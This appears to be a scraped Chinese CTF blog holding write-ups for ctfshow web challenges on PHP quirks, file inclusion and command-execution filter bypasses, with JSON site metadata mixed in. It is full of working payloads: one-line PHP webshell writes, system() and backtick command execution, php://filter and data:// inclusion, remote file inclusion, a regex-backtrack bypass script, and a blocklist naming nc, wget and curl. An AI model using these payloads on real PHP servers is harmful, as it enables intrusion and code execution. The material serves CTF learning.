no!&quot;); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } 16进制绕过 93include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num==4476){ die(&quot;no no no!&quot;); } if(preg_match(&quot;/[a-z]/i&quot;, $num)){ die(&quot;no no no!&quot;); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } 八进制绕过 94 strposinclude(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num===&quot;4476&quot;){ die(&quot;no no no!&quot;); } if(preg_match(&quot;/[a-z]/i&quot;, $num)){ die(&quot;no no no!&quot;); } if(!strpos($num, &quot;0&quot;)){ die(&quot;no no no!&quot;); } if(intval($num,0)===4476){ echo $flag; } } 对于strpos()函数，我们可以利用换行进行绕过（%0a） payload:?num=%0a010574 也可以小数点绕过 payload：?num=4476.0 因为intval()函数只读取整数部分 还可以八进制绕过(%20是空格的url编码形式) payload：?num=%20010574 当然其实 %09，%0b，+等都可以绕过 95&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num==4476){ die(&quot;no no no!&quot;); } if(preg_match(&quot;/[a-z]|\\./i&quot;, $num)){ die(&quot;no no no!!&quot;); } if(!strpos($num, &quot;0&quot;)){ die(&quot;no no no!!!&quot;); } if(intval($num,0)===4476){ echo $flag; } } 多过滤了一个 . 和上题一样,只不过不能用小数绕过了 96highlight_file(__FILE__); if(isset($_GET[&#39;u&#39;])){ if($_GET[&#39;u&#39;]==&#39;flag.php&#39;){ die(&quot;no no no&quot;); }else{ highlight_file($_GET[&#39;u&#39;]); } } /var/www/html/flag.php 绝对路径 ./flag.php 相对路径 php://filter/resource=flag.php php伪协议 97 md5&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) { if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;]) if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) echo $flag; else print &#39;Wrong.&#39;; } ?&gt; MD5碰撞或者数组绕过 98include(&quot;flag.php&quot;); $_GET?$_GET=&amp;$_POST:&#39;flag&#39;; $_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;; $_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_SERVER:&#39;flag&#39;; highlight_file($_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;?$flag:__FILE__); ?&gt; 主要是三元运算符和变量覆盖 $_GET?$_GET=&amp;$_POST:’flag’; 意思就是说如果存在GET请求，则将POST请求覆盖掉GET请求 highlight_file($_GET[‘HTTP_FLAG’]==’flag’?$flag: FILE ); 意思就是说GET传参HTTP_FLAG的值为flag，则读取flag？ 所以我就构造了GET：?flag=123 POST：HTTP_FLAG=flag 99 in_array弱类型比较highlight_file(__FILE__); $allow = array(); for ($i=36; $i &lt; 0x36d; $i++) { array_push($allow, rand(1,$i)); } if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow)){ file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]); } ?&gt; 考察点：php弱类型比较 $allow = array(1,&#39;2&#39;,&#39;3&#39;); var_dump(in_array(&#39;1.php&#39;,$allow)); 返回的为true $allow = array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;); var_dump(in_array(&#39;1.php&#39;,$allow)); 返回false in_array延用了php中的== 具体内容可以查看php手册-&gt;附录-&gt;PHP类型比较表 因为新加进去的随机数字每次都包含1，1存在的几率是最大的。 所以直接写 n=1.php post:content=&lt;?php eval($_POST[1]);?&gt;多试几次即可 100.101 and与&amp;&amp;与=优先级highlight_file(__FILE__); include(&quot;ctfshow.php&quot;); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET[&#39;v1&#39;]; $v2=$_GET[&#39;v2&#39;]; $v3=$_GET[&#39;v3&#39;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0){ if(!preg_match(&quot;/\\;/&quot;, $v2)){ if(preg_match(&quot;/\\;/&quot;, $v3)){ eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;); } } } ?&gt; 知识点一：and 与 &amp;&amp; 原本以为两个都是一样的,但其实运算级有区别,因为赋值运算的优先级比AND和OR的高，所以先赋值；比&amp;&amp;和||的低，所以逻辑运算符先执行，先逻辑运算，再赋值。 所以这里其实只需要is_numberic($v1)为真就行 知识点二: ReflectionClass 类 https://blog.csdn.net/miuzzx/article/details/109168454 payload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; 100非预期解1 直接输出$ctfshow;构造出 var_dump($ctfshow); payload:v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/; 100非预期解2 因为过滤的字符比较少，所以可以直接执行命令。 方法不固定，在此聚两个例子 v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/ v1=1&amp;v2=-system(&#39;ls&#39;)-&amp;v3=-1; 102-103highlight_file(__FILE__); $v1 = $_POST[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; $v3 = $_GET[&#39;v3&#39;]; $v4 = is_numeric($v2) and is_numeric($v3); if($v4){ $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str); } else{ die(&#39;hacker&#39;); } ?&gt; 搬运师傅们的吧 先来说下题目本意 is_numeric在php5的环境中，是可以识别十六进制的，也就是说，如果传入v2=0x66也是可以识别为数字的。 var_dump(is_numeric(&quot;0x66&quot;)); php5的环境下返回true php7返回false 之后经过截断我们就得到了16进制，而且是不带0x的，这时候就可以通过调用函数hex2bin将16进制转换成字符串从而写入木马文件。（hex2bin如果参数带0x会报错） 具体做法： 首先将我们的一句话编码成16进制 &lt;?php eval($_POST[1]);?&gt; 0x3c3f706870206576616c28245f504f53545b315d293b3f3e 接着直接传入v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&amp;v3=1.php post:v1=hex2bin 即可完成木马的写入。 本地测试成功写入木马。 但是该题环境没有设置好用的是php7，所以我们还是得找到另外一种方法绕过。 虽然文件内容不好控制，但是可以利用伪协议将内容进行编码转换。 所以如果能找到一条php语句经过base64编码，在转换为16进制之后全部都是数字不就可以通过了吗？ 也就是说 $a=&quot;xxx&quot;; $b=base64_encode($a); $c=bin2hex($b); 如果$c全部都是纯数字就可以了。 1234 这里直接借用其他师傅的payload $a=&#39;&lt;?=`cat *`;&#39;; $b=base64_encode($a); // PD89YGNhdCAqYDs= $c=bin2hex($b); //这里直接用去掉=的base64 输出 5044383959474e6864434171594473 带e的话会被认为是科学计数法，可以通过is_numeric检测。 大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。 1234567 最终payload：v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php post: v1=hex2bin 104highlight_file(__FILE__); include(&quot;flag.php&quot;); if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_POST[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(sha1($v1)==sha1($v2)){ echo $flag; } } ?&gt; sha1碰撞，使用数组 105highlight_file(__FILE__); include(&#39;flag.php&#39;); error_reporting(0); $error=&#39;你还想要flag嘛？&#39;; $suces=&#39;既然你想要那给你吧！&#39;; foreach($_GET as $key =&gt; $value){ if($key===&#39;error&#39;){ die(&quot;what are you doing?!&quot;); } $$key=$$value; }foreach($_POST as $key =&gt; $value){ if($value===&#39;flag&#39;){ die(&quot;what are you doing?!&quot;); } $$key=$$value; } if(!($_POST[&#39;flag&#39;]==$flag)){ die($error); } echo &quot;your are good&quot;.$flag.&quot;\\n&quot;; die($suces); ?&gt; 这里用了foreach进行变量覆盖 将$error = $flag 成果在die($error)中输出 106-107highlight_file(__FILE__); include(&quot;flag.php&quot;); if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_POST[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2){ echo $flag; } } ?&gt; 数组,碰撞 108&lt;?php highlight_file(__FILE__); error_reporting(0); include(&quot;flag.php&quot;); if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE) { die(&#39;error&#39;); } //只有36d的人才能看到flag if(intval(strrev($_GET[&#39;c&#39;]))==0x36d){ echo $flag; } ?&gt; ereg — 正则表达式匹配 ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配 0x36d是 877 所以构造 ?c=a%00aaaa778 当通过strrev和intval的时候，为 877 109highlight_file(__FILE__); error_reporting(0); if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_GET[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(preg_match(&#39;/[a-zA-Z]+/&#39;, $v1) &amp;&amp; preg_match(&#39;/[a-zA-Z]+/&#39;, $v2)){ eval(&quot;echo new $v1($v2());&quot;); } } ?&gt; 考察点：php 异常类 先来看下这个正则表达式/[a-zA-Z]+/ 匹配至少有一个字母的字符串 所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。 举两个例子 Exception ReflectionClas new 之后我们就可以执行里面的system函数,虽然最后Reflection(system(‘tac f‘)())会报错,但其实已经不影响我们执行system(‘tac f\\‘) payload: v1=Exception();system(&#39;tac f*&#39;);//&amp;v2=a v1=ReflectionClass&amp;v2=system(&#39;tac f*&#39;) 110 highlight_file(__FILE__); error_reporting(0); if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_GET[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(preg_match(&#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#39;, $v1)){ die(&quot;error v1&quot;); } if(preg_match(&#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#39;, $v2)){ die(&quot;error v2&quot;); } eval(&quot;echo new $v1($v2());&quot;); } ?&gt; 利用 FilesystemIterator 获取指定目录下的所有文件 http://phpffff.com/fifilesystemiterator https://www.php.net/manual/zh/class.fifilesystemiterator.php getcwd()函数 获取当前工作目录 返回当前工作目录 payload: ?v1=FilesystemIterator&amp;v2=getcwd 111highlight_file(__FILE__); error_reporting(0); include(&quot;flag.php&quot;); function getFlag(&amp;$v1,&amp;$v2){ eval(&quot;$$v1 = &amp;$$v2;&quot;); var_dump($$v1); } if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){ $v1 = $_GET[&#39;v1&#39;]; $v2 = $_GET[&#39;v2&#39;]; if(preg_match(&#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#39;, $v1)){ die(&quot;error v1&quot;); } if(preg_match(&#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#39;, $v2)){ die(&quot;error v2&quot;); } if(preg_match(&#39;/ctfshow/&#39;, $v1)){ getFlag($v1,$v2); } } ?&gt; 考察点：php超全局变量$GLOBALS的使用 介绍 $GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 举个例子 $a=123; $b=456; var_dump($GLOBALS); 返回内容较多就不一一列出了。我们只看最后两条，发现我们自行定义的变量会被输出。 [&quot;a&quot;]=&gt; int(123) [&quot;b&quot;]=&gt; int(456) 112function filter($file){ if(preg_match(&#39;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#39;,$file)){ die(&quot;hacker!&quot;); }else{ return $file; } } $file=$_GET[&#39;file&#39;]; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo &quot;hacker!&quot;; } 考察点：php伪协议绕过is_file+highlight_file对于php伪协议的使用 函数介绍 is_file — 判断给定文件名是否为一个正常的文件 is_file ( string $filename ) : bool 12 我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议。 可以直接用不带任何过滤器的filter伪协议 payload:file=php://filter/resource=flag.php 也可以用一些没有过滤掉的编码方式和转换方式 payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php file=compress.zlib://flag.php payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php 113highlight_file(__FILE__); error_reporting(0); function filter($file){ if(preg_match(&#39;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#39;,$file)){ die(&quot;hacker!&quot;); }else{ return $file; } } $file=$_GET[&#39;file&#39;]; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo &quot;hacker!&quot;; } 考察： php7.4里面的trick 包含文件32 会溢出,参考make php great again 非预期 compress.zlib://flag.php 114 error_reporting(0); highlight_file(__FILE__); function filter($file){ if(preg_match(&#39;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#39;,$file)){ die(&#39;hacker!&#39;); }else{ return $file; } } $file=$_GET[&#39;file&#39;]; echo &quot;师傅们居然tql都是非预期 哼！&quot;; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo &quot;hacker!&quot;; } 留了个filter payload:file=php://filter/resource=flag.php 115 trim函数的绕过+is_numeric绕过function filter($num){ $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num); return $num; } $num=$_GET[&#39;num&#39;]; if(is_numeric($num) and $num!==&#39;36&#39; and trim($num)!==&#39;36&#39; and filter($num)==&#39;36&#39;){ if($num==&#39;36&#39;){ echo $flag; }else{ echo &quot;hacker!!&quot;; } }else{ echo &quot;hacker!!!&quot;; } 考察点：trim函数的绕过+is_numeric绕过 函数介绍 语法 trim(string,charlist) 参数 描述 string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符： &quot;\\0&quot; - NULL &quot;\\t&quot; - 制表符 &quot;\\n&quot; - 换行 &quot;\\x0B&quot; - 垂直制表符 &quot;\\r&quot; - 回车 &quot; &quot; - 空格 做个简单的小测试 for ($i=0; $i &lt;128 ; $i++) { $x=chr($i).&#39;1&#39;; if(is_numeric($x)==true){ echo urlencode(chr($i)).&quot;\\n&quot;; } } 除了数字和+-.号以外还有 %09 %0a %0b %0c %0d %20 再来看看 trim+is_numeric for ($i=0; $i &lt;=128 ; $i++) { $x=chr($i).&#39;1&#39;; if(trim($x)!==&#39;1&#39; &amp;&amp; is_numeric($x)){ echo urlencode(chr($i)).&quot;\\n&quot;; } } 发现除了+-.号以外还有只剩下%0c也就是换页符了，所以这个题只有这一个固定的解了。 payload:num=%0c3 116117118119120121122123 PHP的字符串解析特性和register_argc_argvhttps://www.freebuf.com/articles/web/213359.html $a=$_SERVER[&#39;argv&#39;]; $c=$_POST[&#39;fun&#39;]; if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;])){ if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\&quot;|\\&#39;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18){ eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;){ echo $flag; } } } 第一个难搞的地方isset($_POST[&#39;CTF_SHOW.COM&#39;])因为php变量命名是不允许使用点号的 然后本地测试，又好像因为规则问题,导致.可以转化出来 另外一个知识点 1、cli模式（命令行）下 第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数 2、web网页模式下 在web页模式下必须在php.ini开启register_argc_argv配置项 设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果 这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’] $argv,$argc在web模式下不适用 因为我们是在网页模式下运行的，所以$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]也就是$a[0]= $_SERVER[&#39;QUERY_STRING&#39;] 这时候我们只要通过 eval(&quot;$c&quot;.&quot;;&quot;);将$flag赋值flag_give_me就可以了。 get: $fl0g=flag_give_me; post: CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0]) POST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag #125 GET:?1=flag.php POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1]) #126 GET:?a=1+fl0g=flag_give_me POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) or GET:?$fl0g=flag_give_me POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0]) 7 127include(&quot;flag.php&quot;); highlight_file(__FILE__); $ctf_show = md5($flag); $url = $_SERVER[&#39;QUERY_STRING&#39;]; //特殊字符检测 function waf($url){ if(preg_match(&#39;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\&#39;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#39;, $url)){ return true; }else{ return false; } } if(waf($url)){ die(&quot;嗯哼？&quot;); }else{ extract($_GET); } if($ctf_show===&#39;ilove36d&#39;){ echo $flag; } payload： ?ctf show=ilove36d 128error_reporting(0); include(&quot;flag.php&quot;); highlight_file(__FILE__); $f1 = $_GET[&#39;f1&#39;]; $f2 = $_GET[&#39;f2&#39;]; if(check($f1)){ var_dump(call_user_func(call_user_func($f1,$f2))); }else{ echo &quot;嗯哼？&quot;; } function check($str){ return !preg_match(&#39;/[0-9]|[a-z]/i&#39;, $str); } https://www.cnblogs.com/lost-1987/articles/3309693.html https://www.php.net/manual/zh/book.gettext.php 小知识点： _()是一个函数 _()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll 所以 call_user_func(&#39;_&#39;,&#39;phpinfo&#39;) 返回的就是phpinfo 因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars get_defined_vars()函数 get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag payload: ?f1=_&amp;f2=get_defined_vars 129if(isset($_GET[&#39;f&#39;])){ $f = $_GET[&#39;f&#39;]; if(stripos($f, &#39;ctfshow&#39;)&gt;0){ echo readfile($f); } } 函数介绍 stripos() 查找字符串在另一字符串中第一次出现的位置（不区分大小写）。 一个简单的方法就是远程文件包含，在自己的服务器上写个一句话，然后保存为txt文档。 例如 f=http://url/xxx.txt?ctfshow 其中xxx.txt为一句话 要是没有服务器的话，我们也可以用php伪协议绕过 payload:f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php filter伪协议支持多种编码方式，无效的就被忽略掉了。 /ctfshow/../../../../var/www/html/flag.php 130-131 error_reporting(0); highlight_file(__FILE__); include(&quot;flag.php&quot;); if(isset($_POST[&#39;f&#39;])){ $f = $_POST[&#39;f&#39;]; if(preg_match(&#39;/.+?ctfshow/is&#39;, $f)){ die(&#39;bye!&#39;); } if(stripos($f, &#39;ctfshow&#39;) === FALSE){ die(&#39;bye!!&#39;); } echo $flag; } 绕过preg_match f[]=1ctfshow 当然看师傅们的博客说的预期解是这样的： 考察点：利用正则最大回溯次数绕过 https://www.laruence.com/2010/06/08/1579.html https://www.freebuf.com/articles/web/190794.html PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。 python脚本如下 import requests url=&quot;http://03771c3c-6afb-4457-a719-19cc6ccf922e.chall.ctf.show/&quot; data={ &#39;f&#39;:&#39;very&#39;*250000+&#39;ctfshow&#39; } r=requests.post(url,data=data) print(r.text) 132include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;])){ $username = (String)$_GET[&#39;username&#39;]; $password = (String)$_GET[&#39;password&#39;]; $code = (String)$_GET[&#39;code&#39;]; if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;){ if($code == &#39;admin&#39;){ echo $flag; } 考察： php中&amp;&amp;和||运算符应用 访问/admin，获得源代码 payload username=admin&amp;password=1&amp;code=admin 133if($F = @$_GET[&#39;F&#39;]){ if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $F)){ eval(substr($F,0,6)); }else{ die(&quot;6个字母都还不够呀?!&quot;); } } get传参 F=`$F `;sleep 3 经过substr($F,0,6)截取后 得到 `$F `; 也就是会执行 eval(&quot;`$F `;&quot;); 我们把原来的$F带进去 eval(&quot;``$F `;sleep 3`&quot;); 也就是说最终会执行 ` `$F `;sleep 3 ` == shell_exec(&quot;`$F `;sleep 3&quot;); 前面的命令我们不需要管，但是后面的命令我们可以自由控制。 这样就在服务器上成功执行了 sleep 3 所以 最后就是一道无回显的RCE题目了 链接奉上: https://blog.csdn.net/qq_46091464/article/details/109095382 134 highlight_file(__FILE__); $key1 = 0; $key2 = 0; if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) { die(&quot;nonononono&quot;); } @parse_str($_SERVER[&#39;QUERY_STRING&#39;]); extract($_POST); if($key1 == &#39;36d&#39; &amp;&amp; $key2 == &#39;36d&#39;) { die(file_get_contents(&#39;flag.php&#39;)); } parse_str() 函数把查询字符串解析到变量中。 extract() 函数从数组中将变量导入到当前的符号表。 ?_POST[key1]=36d&amp;_POST[key2]=36d 135error_reporting(0); highlight_file(__FILE__); //flag.php if($F = @$_GET[&#39;F&#39;]){ if(!preg_match(&#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#39;, $F)){ eval(substr($F,0,6)); }else{ die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;); } } 发现没有限制写文件 payload:F=`$F `;nl f*&gt;xxx 1 然后再去访问url/xxx就可以得到flag了 web136其实是再135的基础上增加了过滤 &gt;&lt;但是linux中还可以用tee写文件 ls|tee xxx 我们先来看下当前目录下有啥文件，访问url/xxx发现只有一个index.php那我们再去看看根目录下有什么文件 ls /|tee xxx 得到 f149_15_h3r3最后直接打开就可以了 nl /f149_15_h3r3|tee xxx 137class ctfshow{ function __wakeup(){ die(“private class”); } static function getFlag(){ echo file_get_contents(“flag.php”); }}call_user_func($_POST[‘ctfshow’]);","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"php特性","slug":"php特性","permalink":"https://pp1ove.gitee.io/tags/php特性/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"ctfshow_文件包含","slug":"ctfshow-文件包含","date":"2021-01-27T08:56:29.000Z","updated":"2021-02-06T15:26:37.356Z","comments":true,"path":"2021/01/27/ctfshow-文件包含/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/27/ctfshow-文件包含/","excerpt":"","text":"78file=php://filter/read=convert.base64-encode/resource=flag.php 79file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= 80-81 包含日志文件我们的请求保存在了日志中,若我们用include包含日志则可能执行里面的php语句 82-86 PHP_SESSION_UPLOAD_PROGRESS进行文件包含if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file); }else{ highlight_file(__FILE__); } 因为之前在session反序列化里面写过了，就不介绍了,这题多了一个条件竞争,开两个burp就行了 87 file_put_content配合协议if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $content = $_POST[&#39;content&#39;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content); }else{ highlight_file(__FILE__); } 先上图， 为了绕过前面的str_replace ,这里将file进行两次编码 而后面的content是与前面的phpdie拼接,&lt;?php die(); 中合法的base64字符串是phpdie,而base64是每四个字一组,则加两个aa,让前面的八个字母组合,从而不影响我们后面的 &lt;?php @eval($_POST[a]); 还有一些相关文章:https://xz.aliyun.com/t/8163#toc-3%20php://filter/write=string.rot13/resource=2.php https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list 88if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file)){ die(&quot;error&quot;); } include($file); }else{ highlight_file(__FILE__); } 过滤了很多,但是没有过滤: 使用伪协议 data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"https://pp1ove.gitee.io/tags/文件包含/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"ctfshow_rce","slug":"ctfshow-rce","date":"2021-01-26T02:57:44.000Z","updated":"2021-03-25T13:10:21.456Z","comments":false,"path":"2021/01/26/ctfshow-rce/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/26/ctfshow-rce/","excerpt":"","text":"ctfshow 命令执行29 过滤flag正则过滤flag,有很多方法绕过, system(&#39;cat fla\\g.php&#39;); 变量拼接 fla&#39;&#39;g 正则绕过 f* 30 过滤systemif(!preg_match(&quot;/flag|system|php/i&quot;, $c)){ eval($c); } system函数过滤掉了可以使用echo ; echo%20`fla\\g.p\\hp`; 此外还有很多命令执行函数 system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 31 过滤cat if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#39;/i&quot;, $c)){ eval($c); } cat被过滤,使用其他读取函数more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 pr: php: sh: 空格绕过&gt; &lt; &lt;&gt; 重定向符 %09(需要php环境) ${IFS} $IFS$9 {cat,flag.php} //用逗号实现了空格功能 %20 %09 %00-%ff 简单的绕过正则&#39;&#39; \\ * 变量拼接 32 过滤echo和括号if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#39;|\\`|echo|\\;|\\(/i&quot;, $c)){ eval($c); } 过滤了echo和括号,无法使用函数绕过 可以结合文件包含漏洞使用 payload： ?c=include%09$_GET[%22x%22]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php 这里涉及到一个问题,就是不能使用;因为分号被ban,查看官方文档,发现可以使用?&gt;来结束eval() 33if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#39;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c)){ eval($c); } 这次双引号也被ban payload ?c=include%09$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php 34多过滤了一个: 35多过滤了一个&lt; ,同33 36多过滤一个 数字 37使用伪协议读取文件 